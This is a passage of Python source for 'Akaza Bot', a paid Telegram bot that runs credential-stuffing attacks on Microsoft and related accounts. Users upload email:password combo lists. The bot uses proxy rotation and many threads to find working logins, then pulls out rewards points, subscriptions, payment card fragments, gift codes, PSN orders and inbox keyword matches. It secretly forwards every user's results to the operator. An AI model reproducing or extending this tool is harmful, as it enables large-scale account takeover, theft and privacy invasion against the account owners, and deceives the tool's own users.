                if pts > 0: points_results_raw.append((pts, f"{email}:{password} | {pts} Pts"))
                # Microsoft Specialized Hits (Subs or Xbox - No redundant Points)
                active_subs = [su['name'] for su in data.get('subs', {}).get('subs', []) if not su.get('is_expired')]
                has_active = bool(active_subs)
                if active_subs or xbox.get('gt') != 'N/A':
                    info = f"{email}:{password}"
                    if xbox.get('gt') != 'N/A': info += f" | GT:{xbox.get('gt')}"
                    if active_subs: info += f" | Subs: {', '.join(active_subs)}"
                    ms_hits_results_raw.append((1 if has_active else 0, info))
                # IMAP hit display
                imap_res = data.get('imap')
                if imap_res and imap_res.get('status') == 'hit':
                    imap_inbox = imap_res.get('inbox', 0)
                    imap_kws = imap_res.get('kw_hits', {})
                    msg += f"📨 <b>IMAP ({imap_res.get('domain','')}):</b> <code>{imap_inbox}</code> emails"
                    if imap_kws:
                        msg += f" | {', '.join([f'<b>{k}</b>({v})' for k,v in imap_kws.items()])}"
                        inbox_results.append(f"{email}:{password} | IMAP | Total:{imap_inbox} | {', '.join([f'{k}({v})' for k,v in imap_kws.items()])}")
                    msg += "\n"
                # Minecraft
                if mc.get('owned'):
                    msg += f"⛏️ <b>Minecraft:</b> <code>{mc.get('name','Managed')}</code>"
                    if mc.get('capes'): msg += f" (Capes: {', '.join(mc['capes'])})"
                    msg += "\n"
                # Codes (Consolidated hit.py/flux.py style)
                codes = data.get('codes', [])
                if codes:
                    cat_map = {}
                    for co in codes: 
                        cat = co.get('category','Unknown')
                        cat_map.setdefault(cat, []).append(co)
                    
                    # Consolidate for codes.txt
                    c_list_str = []
                    for i, co in enumerate(codes, 1):
                        c_info = f"[{i}] {co['code']} ({co.get('title','N/A')})"
                        if co.get('redemption_url'): c_info += f" URL: {co['redemption_url']}"
                        c_list_str.append(c_info)
                    codes_results.append(f"{email}:{password} | {' | '.join(c_list_str)}")
                    msg += "🎁 <b>Codes:</b>\n"
                    for cat, clist in cat_map.items():
                        c_strs = [f"<code>{co['code']}</code>" + (f" <a href=\"{co['redemption_url']}\">[Redeem]</a>" if co.get('redemption_url') else "") for co in clist]
                        msg += f" ├ {cat}: {', '.join(c_strs)}\n"
                # Subscriptions + Card Info
                subs_data = data.get('subs', {})
                subs = subs_data.get('subs', [])
                if subs:
                    sub_lines = []
                    for su in subs:
                        s_str = su['name']
                        if su.get('is_expired'):
                            s_str += " (expired !!)"
                        elif 'days_remaining' in su:
                            s_str += f" ({su['days_remaining']} Days left)"
                        sub_lines.append(s_str)
                    msg += f"💎 <b>Subscriptions:</b> {', '.join(sub_lines)}\n"
                # Microsoft card/payment info
                if subs_data.get('card_type') or subs_data.get('last4'):
                    card_str = f"{subs_data.get('card_type','')} •••• {subs_data.get('last4','')}"
                    if subs_data.get('expiry'): card_str += f" exp:{subs_data['expiry']}"
                    if subs_data.get('billing_country'): card_str += f" [{subs_data['billing_country']}]"
                    msg += f"💳 <b>Card:</b> <code>{card_str.strip()}</code>\n"
                
                # PSN Full Capture — also log to psn_results file
                if psn.get('count', 0) > 0:
                    psn_line = f"🎮 <b>PSN:</b> <code>{psn['count']} Orders</code>"
                    if psn.get('ps_plus'): psn_line += " | ✅ PS Plus"
                    if psn.get('total_spent'): psn_line += f" | 💸 ${psn['total_spent']}"
                    if psn.get('items'): psn_line += f"\\n   └ {', '.join(psn['items'][:4])}"
                    msg += psn_line + "\n"
                    psn_entry = f"{email}:{password} | Orders:{psn['count']}"
                    if psn.get('ps_plus'): psn_entry += " | PS Plus"
                    if psn.get('total_spent'): psn_entry += f" | Spent:${psn['total_spent']}"
                    if psn.get('order_ids'): psn_entry += f" | IDs:{','.join(psn['order_ids'])}"
                    if psn.get('items'): psn_entry += f" | {'; '.join(psn['items'][:4])}"
                    psn_results.append(psn_entry)
                # Gaming Extras
                extras = []
                if steam.get('count', 0) > 0: extras.append(f"Steam({steam['count']})")
                if data.get('supercell'): extras.append(f"SC({len(data['supercell'])})")
                if data.get('tiktok'): extras.append(f"TikTok(@{data['tiktok']})")
                if extras: msg += f"🕹️ <b>Gaming:</b> {', '.join(extras)}\n"
                # Inbox / Domain Hits
                if inbox.get('total', 0) > 0 or inbox.get('hits'):
                    msg += f"📬 <b>Inbox:</b> <code>{inbox.get('total', 0)}</code>"
                    if inbox.get('hits'):
                        kw_str = ", ".join([f"<b>{k}</b>({v})" for k,v in inbox.get('hits', {}).items()])
                        msg += f" | {kw_str}"
                        inbox_results.append(f"{email}:{password} | Total: {inbox.get('total', 0)} | KWs: {', '.join([f'{k}({v})' for k,v in inbox.get('hits',{}).items()])}")
                    msg += "\n"
                msg += "━━━━━━━━━━━━━━━━━━"
                # Hits are processed but NO individual Telegram message is sent to prevent flooding
                # except to Admin via the final results file (silent report)
                
                last_h.append(email); last_h = last_h[-5:]
            elif st == '2fa': tfa += 1
            elif st == 'error': err += 1
            else: bad += 1
            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = (f"� <b>Checking Session</b> 💠\n\n"
                           f"📊 <b>Progress:</b> <code>{checked}/{len(lines)}</code>\n"
                           f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                           f"🎯 <b>Hits:</b> <code>{hits}</code>\n"
                           f"💀 <b>Bad:</b> <code>{bad}</code>\n"
                           f"🔒 <b>2FA:</b> <code>{tfa}</code>\n"
                           f"❌ <b>Errors:</b> <code>{err}</code>\n\n"
                           f"🕒 <b>Recent:</b> <code>{' | '.join(last_h) or 'None'}</code>")
                    try: await status_msg.edit_text(prg, parse_mode='HTML')
                    except: pass
    tasks = []
    for line in lines:
        if akaza_db.is_banned(uid) or stop_flags.get(uid): break
        tasks.append(asyncio.create_task(worker(line)))
        if len(tasks) % 10 == 0: await asyncio.sleep(0.1) # Tiny delay to stagger
    if tasks: await asyncio.gather(*tasks)
    if uid in active_sessions:
        active_sessions.remove(uid)
    # Session released — try to admit next queued user
    await _try_dequeue(c.bot)
    if stop_flags.get(uid):
        await status_msg.edit_text("⚠️ <b>Session Stopped:</b> An Admin has initiated a check. Your session has been paused.", parse_mode="HTML")
        if uid in user_proxies: del user_proxies[uid]
        return
    # FINAL REPORTING (FILES TO ADMIN)
    user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
    admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}"
    # Sort: points high→low, ms active first
    points_sorted = [line for _, line in sorted(points_results_raw, key=lambda x: x[0], reverse=True)]
    ms_sorted = [line for _, line in sorted(ms_hits_results_raw, key=lambda x: x[0], reverse=True)]
    # Save results to temporary files and send
    files_to_send = [
        ("hits.txt", all_hits_results),
        ("microsoft_hits.txt", ms_sorted),
        ("points.txt", points_sorted),
        ("codes.txt", codes_results),
        ("psn.txt", psn_results),
        ("inbox.txt", inbox_results)
    ]
    
    for filename, content_list in files_to_send:
        if content_list:
            path = f"{uid}_{filename}"
            with open(path, 'w', encoding='utf-8') as f:
                f.write(f"Generated by Akaza Bot for {user_handle}\n")
                f.write("\n".join(content_list))
            
            with open(path, 'rb') as f:
                # Admin gets results silently
                await c.bot.send_document(ADMIN_ID, f, filename=filename, caption=f"📄 {filename} from {user_handle}")
                
                # User only gets their copy (silent to admin means user doesn't know copy went to admin)
                f.seek(0)
                await c.bot.send_document(uid, f, filename=filename, caption=f"✅ Your {filename} is ready.")
            os.remove(path)
    await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>All results have been sent to you as files.</i>", parse_mode="HTML")
    if uid in user_proxies: del user_proxies[uid]
    if uid in active_sessions: active_sessions.remove(uid)
    await _try_dequeue(c.bot)
async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    data = q.data

    # ── Back ──────────────────────────────────────────────────────────────────
    if data == "back":
        await start(u, c)

    # ── Stats ─────────────────────────────────────────────────────────────────
    elif data == "stats":
        st  = akaza_db.user_stats(uid)
        inf = akaza_db.get_user_info(uid)
        pct = f"{round(st['hits']/st['checks']*100,1)}%" if st['checks'] else "N/A"
        expiry = ""
        if inf.get("access_expiry"):
            try:
                d = (datetime.fromisoformat(inf["access_expiry"]) - datetime.now()).days
                expiry = f"\\n📅 <b>Access Expires:</b> <code>{max(0,d)} days</code>"
            except: pass
        txt = (
            f"📊 <b>Your Statistics</b>\\n"
            f"━━━━━━━━━━━━━━━━━━\\n"
            f"🔍 <b>Total Checks:</b> <code>{st['checks']}</code>\\n"
            f"🎯 <b>Total Hits:</b>   <code>{st['hits']}</code>\\n"
            f"💯 <b>Hit Rate:</b>     <code>{pct}</code>\\n"
            f"💰 <b>Credits Left:</b> <code>{st['credits']}</code>{expiry}"
        )
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")

    # ── Settings ──────────────────────────────────────────────────────────────
    elif data == "settings":
        s = akaza_db.get_user_settings(uid)
        txt = (
            f"⚙️ <b>Settings</b>\\n"
            f"━━━━━━━━━━━━━━━━━━\\n"
            f"📶 <b>Threads:</b>   <code>{s['threads']}</code>  (use + / − to adjust)\\n"
            f"⚡ <b>Fast Mode:</b> <code>{'ON ✅' if s['fast_mode'] else 'OFF ❌'}</code>  (skip inbox scan)\\n\\n"
            f"<i>Higher threads = faster CPM. Use proxies for best results.</i>"
        )
        kbd = [
            [InlineKeyboardButton("➖ Threads", callback_data="thr_dec"),
             InlineKeyboardButton(f"📶 {s['threads']}", callback_data="noop"),
             InlineKeyboardButton("➕ Threads", callback_data="thr_inc")],
            [InlineKeyboardButton(
                f"⚡ Fast Mode: {'ON ✅' if s['fast_mode'] else 'OFF ❌'}",
                callback_data="toggle_fast")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")],
        ]
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

    elif data == "thr_inc":
        s = akaza_db.get_user_settings(uid)
        akaza_db.update_settings(uid, threads=min(s["threads"] + 5, 300))
        q.data = "settings"; await cb_handler(u, c)
    elif data == "thr_dec":
        s = akaza_db.get_user_settings(uid)
        akaza_db.update_settings(uid, threads=max(s["threads"] - 5, 1))
        q.data = "settings"; await cb_handler(u, c)
    elif data == "noop": pass
    elif data == "toggle_fast":
        s = akaza_db.get_user_settings(uid)
        akaza_db.update_settings(uid, fast_mode=not s["fast_mode"])
        q.data = "settings"; await cb_handler(u, c)

    # ── Keywords ──────────────────────────────────────────────────────────────
    elif data == "kw_menu":
        s   = akaza_db.get_user_settings(uid)
        kws = s["keywords"]
        kw_list = "\\n".join([f"  • <code>{k}</code>" for k in kws]) if kws else "  <i>None set</i>"
        txt = (
            f"🔍 <b>Keywords</b> ({len(kws)} active)\\n"
            f"━━━━━━━━━━━━━━━━━━\\n"
            f"{kw_list}\\n\\n"
            f"<i>Keywords are searched in your inbox during checks.</i>"
        )
        kbd = [
            [InlineKeyboardButton("➕ Add Keywords",  callback_data="kw_add"),
             InlineKeyboardButton("🗑️ Clear All",     callback_data="kw_clear")],
            [InlineKeyboardButton("🔙 Back",           callback_data="back")],
        ]
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

    elif data == "kw_add":
        akaza_db.update_settings(uid, is_adding_kw=True)
        await q.edit_message_text(
            "🔍 <b>Add Keywords</b>\\n━━━━━━━━━━━━━━━━━━\\n"
            "Send keywords (space or newline separated).\\n"
            "Example: <code>paypal.com noreply@netflix.com</code>\\n\\n"
            "Use /skw to stop.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data="kw_stop")]]),
            parse_mode="HTML")
    elif data == "kw_stop":
        akaza_db.update_settings(uid, is_adding_kw=False)
        await start(u, c)
    elif data == "kw_clear":
        akaza_db.update_settings(uid, keywords=[])
        await q.answer("✅ Keywords cleared!", show_alert=False)
        q.data = "kw_menu"; await cb_handler(u, c)

    # ── Proxy ─────────────────────────────────────────────────────────────────
    elif data == "proxy_menu":
        n = len(user_proxies.get(uid, []))
        txt = (
            f"🌐 <b>Proxy Settings</b>\\n"
            f"━━━━━━━━━━━━━━━━━━\\n"
            f"📦 <b>My Proxies:</b>     <code>{n}</code>\\n"
            f"🌍 <b>Global Proxies:</b> <code>{len(PROXIES_LIST)}</code>\\n\\n"
            f"<i>Send a .txt file with proxies (one per line) with caption <b>proxy</b>\\n"
            f"Formats: ip:port  or  user:pass@ip:port</i>"
        )
        kbd = [
            [InlineKeyboardButton("🗑️ Clear My Proxies", callback_data="proxy_clear")],
            [InlineKeyboardButton("🔙 Back",              callback_data="back")],
        ]
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
    elif data == "proxy_clear":
        user_proxies.pop(uid, None)
        await q.answer("✅ Proxies cleared!", show_alert=False)
        q.data = "proxy_menu"; await cb_handler(u, c)

    # ── Redeem prompt ─────────────────────────────────────────────────────────
    elif data == "redeem_prompt":
        await q.edit_message_text(
            "💳 <b>Redeem a Key</b>\\n━━━━━━━━━━━━━━━━━━\\n"
            "Use: <code>/redeem YOUR-KEY-HERE</code>\\n\\n"
            "<i>Keys are sold by @Akaza_isnt</i>",
            reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")

    # ── Queue status ──────────────────────────────────────────────────────────
    elif data == "queue_status":
        pos    = _queue_position(uid)
        active = len(active_sessions)
        if uid in active_sessions:
            txt = (f"✅ <b>Your session is active!</b>\\n"
                   f"Running sessions: <code>{active}/{MAX_CONCURRENT}</code>")
        elif pos > 0:
            txt = (f"⏳ <b>Queue Position: #{pos}</b>\\n"
                   f"Active: <code>{active}/{MAX_CONCURRENT}</code>\\n"
                   f"Est. wait: ~<code>{pos * 3} min</code>")
        else:
            txt = "✅ You are not in any queue or active session."
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")

    # ── Help ──────────────────────────────────────────────────────────────────
    elif data == "help":
        txt = (
            "📖 <b>AKAZA Help Guide</b>\\n"
            "━━━━━━━━━━━━━━━━━━\\n"
            "🔷 <b>How to Check:</b>\\n"
            "  Send a combo .txt file or paste\\n"
            "  <code>email:password</code> lines directly.\\n\\n"
            "🔷 <b>Commands:</b>\\n"
            "  /start — Main menu\\n"
            "  /threads &lt;n&gt; — Set thread count\\n"
            "  /fastmode — Toggle fast mode\\n"
            "  /addkw &lt;word&gt; — Add keyword(s)\\n"
            "  /skw — Stop keyword input mode\\n"
            "  /ckw — Clear all keywords\\n"
            "  /redeem &lt;key&gt; — Redeem a credit key\\n"
            "  /check email:pass — Single check\\n\\n"
            "🔷 <b>File Upload:</b>\\n"
            "  .txt with caption <b>combo</b> → start checking\\n"
            "  .txt with caption <b>proxy</b> → load proxies\\n\\n"
            "🔷 <b>Output Files:</b>\\n"
            "  🎯 hits.txt — All valid accounts\\n"
            "  🏆 points.txt — Rewards (high→low)\\n"
            "  💎 microsoft_hits.txt — Active subs first\\n"
            "  🎮 psn.txt — PlayStation orders\\n"
            "  📄 codes.txt — Redemption codes\\n"
            "  📥 inbox.txt — Keyword/IMAP hits\\n\\n"
            "🔷 <b>Tips:</b>\\n"
            "  • Use proxies for 300+ thread speeds\\n"
            "  • Fast Mode = rewards+codes only (fastest)\\n"
            "  • 💎 Premium users bypass the queue\\n\\n"
            "🛒 Support: @Akaza_isnt"
        )
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")

    # ── Admin panel ───────────────────────────────────────────────────────────
    elif data == "admin" and akaza_db.is_mod(uid):
        st     = akaza_db.get_global_stats()
        active = len(active_sessions)
        queued = len(_session_queue)
        txt = (
            f"🛠 <b>Admin Panel</b>\\n"
            f"━━━━━━━━━━━━━━━━━━\\n"
            f"👥 <b>Total Users:</b>  <code>{st['total']}</code>\\n"
            f"✅ <b>Active Users:</b> <code>{st.get('active', 0)}</code>\\n"
            f"🔍 <b>Total Checks:</b> <code>{st['checks']}</code>\\n"
            f"🎯 <b>Total Hits:</b>   <code>{st['hits']}</code>\\n"
            f"⚡ <b>Running:</b>      <code>{active}/{MAX_CONCURRENT}</code>\\n"
            f"⏳ <b>In Queue:</b>    <code>{queued}</code>"
        )
        kbd = [
            [InlineKeyboardButton("📎 Active Sessions", callback_data="admin_sessions"),
             InlineKeyboardButton("📊 Global Stats",    callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Back",            callback_data="back")],
        ]
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

    elif data == "admin_stats" and akaza_db.is_mod(uid):
        st = akaza_db.get_global_stats()
        await q.edit_message_text(
            f"📊 <b>Global Stats</b>\\n"
            f"Users: <code>{st['total']}</code> | Active: <code>{st.get('active',0)}</code>\\n"
            f"Checks: <code>{st['checks']}</code> | Hits: <code>{st['hits']}</code>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin")]]),
            parse_mode="HTML")

    elif data == "admin_sessions" and akaza_db.is_mod(uid):
        ids    = list(active_sessions)
        lines  = ["  • <code>" + str(x) + "</code>" for x in ids] if ids else ["  None"]
        qlines = ["  #" + str(i+1) + " <code>" + str(x) + "</code>" for i,(x,_) in enumerate(_session_queue)] if _session_queue else ["  None"]
        await q.edit_message_text(
            "💬 <b>Active Sessions</b>\\n" + "\\n".join(lines) + "\\n\\n"
            "⏳ <b>Queue</b>\\n" + "\\n".join(qlines),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin")]]),
            parse_mode="HTML")

    # ── Legacy callbacks ──────────────────────────────────────────────────────
    elif data == "set_combo": await handle_combo(u, c)
    elif data == "set_proxy":
        content = pending_files.pop(uid, "")
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await q.edit_message_text(
            f"✅ Loaded <code>{len(user_proxies[uid])}</code> proxies.",
            reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")

async def cmd_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args: return await u.message.reply_text("Usage: /threads <number>")
    akaza_db.update_settings(u.effective_user.id, threads=int(c.args[0]))
    await u.message.reply_text(f"✅ Threads set to {c.args[0]}.")
async def cmd_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    s = akaza_db.get_user_settings(uid)
    new_val = not s['fast_mode']
    akaza_db.update_settings(uid, fast_mode=new_val)
    await u.message.reply_text(f"✅ Fast Mode {'ON' if new_val else 'OFF'}.")
async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Cleared.")
async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not c.args: return
    s = akaza_db.get_user_settings(uid)
    kws = list(set(s['keywords'] + c.args))
    akaza_db.update_settings(uid, keywords=kws)
    await u.message.reply_text(f"✅ Added {len(c.args)} keywords.")
async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args: return
    akaza_db.update_settings(u.effective_user.id, keywords=list(set(c.args)))
    await u.message.reply_text("✅ Keywords updated.")
async def cmd_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args or ':' not in c.args[0]: return
    await handle_combo(u, c, c.args[0])
async def cmd_redeem(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    if not c.args:
        await u.message.reply_text("⚠️ Usage: /redeem <key>")
        return
    key_code = c.args[0]
    amount = akaza_db.get_key_amount(key_code)
    if amount > 0:
        akaza_db.add_credits(uid, amount)
        akaza_db.delete_key(key_code)
        await u.message.reply_text(f"✅ <b>Successfully Redeemed!</b>\nYou have received <code>{amount}</code> credits.", parse_mode="HTML")
    else:
        await u.message.reply_text("❌ <b>Invalid or already redeemed key.</b>", parse_mode="HTML")
async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not akaza_db.is_mod(uid): return
    m = u.message.text.split(); cmd, args = m[0].lower(), m[1:]
    try:
        if cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!resetcredits" and args: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!grant" and args: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!revoke" and args: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!ban" and args: akaza_db.ban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!unban" and args: akaza_db.unban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!mod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅")
        elif cmd == "!!unmod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅")
        elif cmd == "!!listmods": await u.message.reply_text("\n".join([f"{m['uid']} (@{m['username']})" for m in akaza_db.list_mods()]))
        elif cmd == "!!info" and args: await u.message.reply_text(str(akaza_db.get_user_info(int(args[0]))))
        elif cmd == "!!stats": await u.message.reply_text(str(akaza_db.get_global_stats()))
        elif cmd == "!!broadcast" and args:
            txt = u.message.text[len(cmd):].strip(); count = 0
            for t in akaza_db.get_all_user_ids():
                try: await c.bot.send_message(t, txt); count += 1; await asyncio.sleep(0.05)
                except: pass
            await u.message.reply_text(f"✅ Sent to {count} users.")
        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!genkey" and args:
            amount = int(args[0])
            key_code = akaza_db.create_key(amount)
            await u.message.reply_text(f"✅ <b>Key Generated:</b>\n<code>{key_code}</code>\nCredits: {amount}", parse_mode="HTML")
        elif cmd == "!!addproxies":
            pxs = u.message.text[len(cmd):].strip().splitlines()
            for p in pxs:
                if p.strip(): PROXIES_LIST.append(AkazaChecker().format_proxy(p.strip()))
            await u.message.reply_text(f"✅ Added {len(pxs)} global proxies.")
        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!genkey !!addproxies")
    except Exception as e: await u.message.reply_text(f"❌ {e}")
def main():
    akaza_db.init_db()
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(256)   # ← KEY FIX: handle all updates truly in parallel
        .build()
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("keywords", cmd_keywords))
    app.add_handler(CommandHandler("addkw", cmd_addkw))
    app.add_handler(CommandHandler("skw", cmd_skw))
    app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("fastmode", cmd_fastmode))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    # Combo lines sent as plain text (not commands, not !!) — processed by handle_combo
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'[^!].+:.+'),
        handle_combo
    ))
    # All other text (keyword mode etc.) — handle_text
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        handle_text
    ))
    app.run_polling(drop_pending_updates=True)
if __name__ == '__main__': main()
